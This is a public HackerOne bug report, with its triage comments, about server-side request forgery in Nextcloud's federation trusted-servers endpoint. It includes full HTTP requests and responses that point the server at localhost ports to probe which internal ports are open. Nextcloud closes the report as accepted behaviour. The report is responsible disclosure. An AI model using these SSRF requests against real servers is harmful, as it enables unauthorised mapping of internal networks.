{"id":145524,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDU1MjQ=","url":"https://hackerone.com/reports/145524","title":"Server side request forgery (SSRF) on nextcloud implementation.","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2016-06-17T19:27:26.292Z","submitted_at":"2016-06-17T19:27:26.292Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"paglababa","url":"/paglababa","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/085/805/ab247fbb0f205000b4ff554890b64b285fefb386_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-06-17T19:41:05.007Z","bug_reporter_agreed_on_going_public_at":"2016-06-17T19:36:00.264Z","team_member_agreed_on_going_public_at":"2016-06-17T19:41:04.890Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"An admin of nextcloud server can add other trusted nextcloud server in his own installation. The following request passes when a new add request  is processed:\n\n```http\nPOST /nextcloud/index.php/apps/federation/trusted-servers HTTP/1.1\nHost: myown.nextcloudserver.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: GAFcYDUGGyM0CCYeIlk4b19ADhwOFgcLOy4kERdDL1Q=:AL1VmGJMGqQsVhw59y9yE/wsjGJWMtc8DJljyuFMaI4=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 27\nCookie: oc6wp9sjado5=nnofa4hfq2esn7anu70hg3c2h0; oc_sessionPassphrase=dvniWxtCrcQk4Nbt4eXXmyZu5wUk3JoHziCUaCBcmeQFaM0333bS8HBwvFOAEwF2f0cnj9gewI7OSn1ELD3IiOysU3FOj%2FkA%2BV2kZ%2FUmc9UMQTzoZpp1VSLNUJXEKQkw; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true\nConnection: close\n\nurl=http://nextcloud.remote.server.com/\n```\n\nThis request initiates a **cURL** request to the **POST** variable. The response looks like this:\n\n```http\nHTTP/1.1 400 Bad request\nDate: Fri, 17 Jun 2016 19:21:09 GMT\nServer: Apache/2.4.7 (Ubuntu)\nX-Powered-By: PHP/5.5.9-1ubuntu4.14\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-cache, must-revalidate\nPragma: no-cache\nContent-Security-Policy: default-src 'none';script-src 'self' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self';connect-src 'self';media-src 'self'\nX-XSS-Protection: 1; mode=block\nX-Content-Type-Options: nosniff\nX-Frame-Options: Sameorigin\nX-Robots-Tag: none\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nContent-Length: 117\nConnection: close\nContent-Type: application/json; charset=utf-8\n\n{\"message\":\"Client error response [url] http:\\/\\/google.com\\/status.php [status code] 404 [reason phrase] Not Found\"}\n```\n\n**Attack Scenario**\nThis feature can be used to launch SSRF attack to map the internal network. For example, this feature can be used to identify the internal open ports. Consider the following example:\n\n```http\nPOST /nextcloud/index.php/apps/federation/trusted-servers HTTP/1.1\nHost: myown.nextcloudserver.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: GAFcYDUGGyM0CCYeIlk4b19ADhwOFgcLOy4kERdDL1Q=:AL1VmGJMGqQsVhw59y9yE/wsjGJWMtc8DJljyuFMaI4=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 23\nCookie: oc6wp9sjado5=nnofa4hfq2esn7anu70hg3c2h0; oc_sessionPassphrase=dvniWxtCrcQk4Nbt4eXXmyZu5wUk3JoHziCUaCBcmeQFaM0333bS8HBwvFOAEwF2f0cnj9gewI7OSn1ELD3IiOysU3FOj%2FkA%2BV2kZ%2FUmc9UMQTzoZpp1VSLNUJXEKQkw; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true\nConnection: close\n\nurl=http://127.0.0.1:80\n```\n\n**Response**\n\n```json\n{\"message\":\"Client error response [url] http:\\/\\/127.0.0.1\\/status.php [status code] 404 [reason phrase] Not Found\"}\n```\n\nThis indicates that port **80** of the localhost is open. To check port 8080 we used **http://127.0.0.1:8080** as **POST** value and  the following response was received :\n\n```json\n{\"message\":\"cURL error 7: Failed to connect to 127.0.0.1 port 8080: Connection refused\"}\n```\n\nWe received an error because the PORT 8080 of localhost was blocked.","vulnerability_information_html":"\u003cp\u003eAn admin of nextcloud server can add other trusted nextcloud server in his own installation. The following request passes when a new add request  is processed:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/nextcloud/index.php/apps/federation/trusted-servers\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003emyown.nextcloudserver.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eUser-Agent\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eMozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e*/*\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Language\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003een-US,en;q=0.5\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003egzip, deflate\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded; charset=UTF-8\u003c/span\u003e\n\u003cspan class=\"na\"\u003erequesttoken\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eGAFcYDUGGyM0CCYeIlk4b19ADhwOFgcLOy4kERdDL1Q=:AL1VmGJMGqQsVhw59y9yE/wsjGJWMtc8DJljyuFMaI4=\u003c/span\u003e\n\u003cspan class=\"na\"\u003eOCS-APIREQUEST\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etrue\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Requested-With\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eXMLHttpRequest\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e27\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eoc6wp9sjado5=nnofa4hfq2esn7anu70hg3c2h0; oc_sessionPassphrase=dvniWxtCrcQk4Nbt4eXXmyZu5wUk3JoHziCUaCBcmeQFaM0333bS8HBwvFOAEwF2f0cnj9gewI7OSn1ELD3IiOysU3FOj%2FkA%2BV2kZ%2FUmc9UMQTzoZpp1VSLNUJXEKQkw; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true\u003c/span\u003e\n\u003cspan class=\"na\"\u003eConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eclose\u003c/span\u003e\n\nurl=http://nextcloud.remote.server.com/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis request initiates a \u003cstrong\u003ecURL\u003c/strong\u003e request to the \u003cstrong\u003ePOST\u003c/strong\u003e variable. The response looks like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e400\u003c/span\u003e \u003cspan class=\"ne\"\u003eBad request\u003c/span\u003e\n\u003cspan class=\"na\"\u003eDate\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eFri, 17 Jun 2016 19:21:09 GMT\u003c/span\u003e\n\u003cspan class=\"na\"\u003eServer\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eApache/2.4.7 (Ubuntu)\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Powered-By\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ePHP/5.5.9-1ubuntu4.14\u003c/span\u003e\n\u003cspan class=\"na\"\u003eExpires\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eThu, 19 Nov 1981 08:52:00 GMT\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCache-Control\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eno-cache, must-revalidate\u003c/span\u003e\n\u003cspan class=\"na\"\u003ePragma\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eno-cache\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Security-Policy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003edefault-src \u0026#39;none\u0026#39;;script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-eval\u0026#39;;style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;;img-src \u0026#39;self\u0026#39; data: blob:;font-src \u0026#39;self\u0026#39;;connect-src \u0026#39;self\u0026#39;;media-src \u0026#39;self\u0026#39;\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-XSS-Protection\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e1; mode=block\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Content-Type-Options\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003enosniff\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Frame-Options\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eSameorigin\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Robots-Tag\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003enone\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Download-Options\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003enoopen\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Permitted-Cross-Domain-Policies\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003enone\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e117\u003c/span\u003e\n\u003cspan class=\"na\"\u003eConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eclose\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json; charset=utf-8\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;message\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Client error response [url] http:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003egoogle.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003estatus.php [status code] 404 [reason phrase] Not Found\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Scenario\u003c/strong\u003e\u003cbr\u003e\nThis feature can be used to launch SSRF attack to map the internal network. For example, this feature can be used to identify the internal open ports. Consider the following example:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/nextcloud/index.php/apps/federation/trusted-servers\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003emyown.nextcloudserver.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eUser-Agent\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eMozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e*/*\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Language\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003een-US,en;q=0.5\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003egzip, deflate\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded; charset=UTF-8\u003c/span\u003e\n\u003cspan class=\"na\"\u003erequesttoken\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eGAFcYDUGGyM0CCYeIlk4b19ADhwOFgcLOy4kERdDL1Q=:AL1VmGJMGqQsVhw59y9yE/wsjGJWMtc8DJljyuFMaI4=\u003c/span\u003e\n\u003cspan class=\"na\"\u003eOCS-APIREQUEST\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etrue\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Requested-With\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eXMLHttpRequest\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e23\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eoc6wp9sjado5=nnofa4hfq2esn7anu70hg3c2h0; oc_sessionPassphrase=dvniWxtCrcQk4Nbt4eXXmyZu5wUk3JoHziCUaCBcmeQFaM0333bS8HBwvFOAEwF2f0cnj9gewI7OSn1ELD3IiOysU3FOj%2FkA%2BV2kZ%2FUmc9UMQTzoZpp1VSLNUJXEKQkw; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true\u003c/span\u003e\n\u003cspan class=\"na\"\u003eConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eclose\u003c/span\u003e\n\nurl=http://127.0.0.1:80\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eResponse\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;message\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Client error response [url] http:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e127.0.0.1\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003estatus.php [status code] 404 [reason phrase] Not Found\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis indicates that port \u003cstrong\u003e80\u003c/strong\u003e of the localhost is open. To check port 8080 we used \u003cstrong\u003e\u003ca title=\"http://127.0.0.1:8080\" href=\"/redirect?url=http%3A%2F%2F127.0.0.1%3A8080\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://127.0.0.1:8080\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/strong\u003e as \u003cstrong\u003ePOST\u003c/strong\u003e value and  the following response was received :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;message\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;cURL error 7: Failed to connect to 127.0.0.1 port 8080: Connection refused\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe received an error because the PORT 8080 of localhost was blocked.\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":18,"voters":["smiegles","shailesh4594","gerben_javado","nahamsec","robd4k","skansing","try_to_hack","guido","theflofly","paramdham","and 8 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1019954,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us!\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we\u0026#39;d like to ask you to not disclose this issue to any other party.\u003c/p\u003e\n","automated_response":true,"created_at":"2016-06-17T19:27:26.518Z","updated_at":"2016-06-17T19:27:26.518Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1019960,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Thanks a lot for your report. Much appreciated!\n\nWe're considering Server-Side Request forgery accepted behaviour considering the fact that many features of Nextcloud rely on features such as federation.\n\nWe'd like to encourage to keep hacking. We're looking forward to your next report!","markdown_message":"\u003cp\u003eThanks a lot for your report. Much appreciated!\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re considering Server-Side Request forgery accepted behaviour considering the fact that many features of Nextcloud rely on features such as federation.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;d like to encourage to keep hacking. We\u0026#39;re looking forward to your next report!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-17T19:30:59.660Z","updated_at":"2016-06-17T19:30:59.660Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1019963,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"But you can easily mitigate the issue by blocking internal request. In such case federation implementation will also work by revoking the threat of internal network mapping.","markdown_message":"\u003cp\u003eBut you can easily mitigate the issue by blocking internal request. In such case federation implementation will also work by revoking the threat of internal network mapping.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-17T19:32:56.104Z","updated_at":"2016-06-17T19:32:56.104Z","actor":{"username":"paglababa","cleared":false,"url":"/paglababa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/085/805/ab247fbb0f205000b4ff554890b64b285fefb386_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1019973,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"A public disclosure will be appreciated because I know many researcher will report this, if they dont know that this will not be accepted.","markdown_message":"\u003cp\u003eA public disclosure will be appreciated because I know many researcher will report this, if they dont know that this will not be accepted.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-17T19:36:00.291Z","updated_at":"2016-06-17T19:36:00.291Z","first_to_agree":true,"actor":{"username":"paglababa","cleared":false,"url":"/paglababa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/085/805/ab247fbb0f205000b4ff554890b64b285fefb386_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1019978,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e But you can easily mitigate the issue by blocking internal request. In such case federation implementation will also work by revoking the threat of internal network mapping.\n\nThis is a little bit harder given our technology stack. Basically there is no easy way for us to detect whether a domain name resolves to an internal IP address without running into race-conditional situations.\n\n\u003e A public disclosure will be appreciated because I know many researcher will report this, if they dont know that this will not be accepted.\n\nAbsolutely. We're always happy to disclose any reported issue to us! And thanks again for reporting this back to us, much appreciated!","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eBut you can easily mitigate the issue by blocking internal request. In such case federation implementation will also work by revoking the threat of internal network mapping.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThis is a little bit harder given our technology stack. Basically there is no easy way for us to detect whether a domain name resolves to an internal IP address without running into race-conditional situations.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eA public disclosure will be appreciated because I know many researcher will report this, if they dont know that this will not be accepted.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eAbsolutely. We\u0026#39;re always happy to disclose any reported issue to us! And thanks again for reporting this back to us, much appreciated!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-17T19:41:00.075Z","updated_at":"2016-06-17T19:41:00.075Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1019979,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-17T19:41:04.965Z","updated_at":"2016-06-17T19:41:04.965Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1019980,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-17T19:41:05.049Z","updated_at":"2016-06-17T19:41:05.049Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}